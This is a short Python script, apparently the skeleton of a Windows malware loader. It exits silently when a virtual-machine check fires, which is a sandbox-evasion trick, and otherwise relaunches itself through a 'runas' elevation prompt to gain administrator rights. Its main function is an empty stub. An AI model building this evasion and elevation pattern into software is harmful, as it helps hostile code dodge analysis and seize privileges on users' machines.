import sys
import ctypes
import os
import tempfile
import shutil
import uuid
import atexit

from components import isvm

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    pass

if __name__ == "__main__":
    if isvm:
        sys.exit(0)
    elif is_admin():
        main()
    else:
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        if result <= 32:
            sys.exit(0)